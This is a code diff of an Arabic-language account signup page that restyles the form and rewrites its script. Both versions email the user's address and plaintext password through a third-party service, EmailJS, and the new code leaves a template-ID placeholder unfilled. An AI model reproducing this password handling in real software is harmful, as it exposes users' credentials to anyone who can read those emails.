@@ -3,53 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التسجيل</title>
+    <title>تسجيل حساب جديد</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             font-family: 'Cairo', sans-serif;
-            direction: rtl;
-            text-align: right;
             margin: 0;
             padding: 0;
+            background: linear-gradient(to bottom right, #E0F7FA, #FFCDD2);
+            color: #333;
+            direction: rtl;
+            text-align: right;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #f4f4f9;
         }
 
         .container {
             background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            width: 400px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            width: 420px;
+            text-align: center;
+            border-top: 5px solid #4CAF50;
         }
 
-        form {
-            display: flex;
-            flex-direction: column;
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #4CAF50;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
         }
 
         label {
-            margin-top: 10px;
+            display: block;
+            margin-bottom: 5px;
             font-weight: bold;
+            font-size: 1.1rem;
+            color: #4CAF50;
         }
 
         input {
-            margin-bottom: 15px;
-            padding: 8px;
-            border-radius: 5px;
+            width: 100%;
+            padding: 12px;
             border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1rem;
         }
 
         button {
-            margin-top: 10px;
-            padding: 10px;
+            margin-top: 20px;
+            width: 100%;
             background-color: #4CAF50;
             color: white;
+            padding: 12px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 1.2rem;
             cursor: pointer;
         }
 
@@ -57,72 +75,91 @@
             background-color: #388E3C;
         }
 
-        .success-message {
-            margin-top: 15px;
-            color: #2E7D32;
-            font-weight: bold;
-        }
-
         .error-message {
-            margin-top: 15px;
+            margin-top: 20px;
             color: #D32F2F;
             font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .success-message {
+            margin-top: 20px;
+            color: #388E3C;
+            font-weight: bold;
+            font-size: 1.2rem;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🔑 التسجيل</h2>
-        <form id="registerForm">
-            <label for="username">اسم المستخدم:</label>
-            <input type="text" id="username" required>
-
-            <label for="email">البريد الإلكتروني:</label>
-            <input type="email" id="email" required>
-
-            <label for="password">كلمة المرور:</label>
-            <input type="password" id="password" required>
-
-            <button type="submit">تسجيل</button>
+        <h1>🔑 تسجيل حساب جديد</h1>
+        <form id="signupForm">
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" name="email" placeholder="أدخل بريدك الإلكتروني" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit">تسجيل الحساب</button>
         </form>
-        <div class="success-message" id="successMessage" style="display:none;">✅ تم إرسال رابط التفعيل إلى بريدك الإلكتروني.</div>
-        <div class="error-message" id="errorMessage" style="display:none;">❌ حدث خطأ أثناء التسجيل. حاول مرة أخرى.</div>
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
     </div>
 
-   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-    (function(){
-        emailjs.init("g9DzapSDwZ2_ux_if"); // App Key الجديد
-    })();
+    <script>
+        // تهيئة Email.js باستخدام public key
+        emailjs.init('g9DzapSDwZ2_ux_if'); // تم إضافة المفتاح الخاص بك هنا
 
-    document.getElementById('registerForm').addEventListener('submit', function(event) {
-        event.preventDefault();
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            
+            // تحقق من تنسيق البريد الإلكتروني
+            const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+            
+            // التحقق من أن البريد الإلكتروني صالح
+            if (!email || !emailRegex.test(email)) {
+                errorMessage.textContent = '❌ البريد الإلكتروني غير صالح.';
+                successMessage.textContent = '';
+                return;
+            }
 
-        const username = document.getElementById('username').value.trim();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
+            // التحقق من أن كلمة المرور ليست فارغة
+            if (!password) {
+                errorMessage.textContent = '❌ كلمة المرور غير صحيحة.';
+                successMessage.textContent = '';
+                return;
+            }
 
-        if (email && password && username) {
-            emailjs.send("service_fr16kl9", "template_sh7koo", {
-                username: username,
-                email: email,
-                password: password
-            })
-            .then(function(response) {
-                document.getElementById('successMessage').style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = 'Login.html';
-                }, 2000);
-            }, function(error) {
-                document.getElementById('errorMessage').style.display = 'block';
-                console.error("خطأ:", error);
-            });
-        } else {
-            document.getElementById('errorMessage').style.display = 'block';
-            document.getElementById('errorMessage').innerText = '❌ يرجى ملء جميع الحقول.';
-        }
-    });
-</script>
+            // إرسال البريد الإلكتروني عبر Email.js (بدون استخدام قالب)
+            const emailContent = `
+                تم تسجيل حساب جديد:
+                البريد الإلكتروني: ${email}
+                كلمة المرور: ${password}
+            `;
 
+            const templateParams = {
+                user_email: email,
+                message: emailContent
+            };
+
+            // إرسال البريد الإلكتروني مباشرة باستخدام Email.js
+            emailjs.send('service_fr16kl9', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    successMessage.textContent = '✅ تم تسجيل الحساب بنجاح!';
+                    errorMessage.textContent = '';
+                    window.location.href = 'welcome.html'; // صفحة الترحيب بعد التسجيل الناجح
+                }, function(error) {
+                    errorMessage.textContent = '❌ فشل إرسال البريد الإلكتروني.';
+                    successMessage.textContent = '';
+                });
+        });
+    </script>
 </body>
 </html>
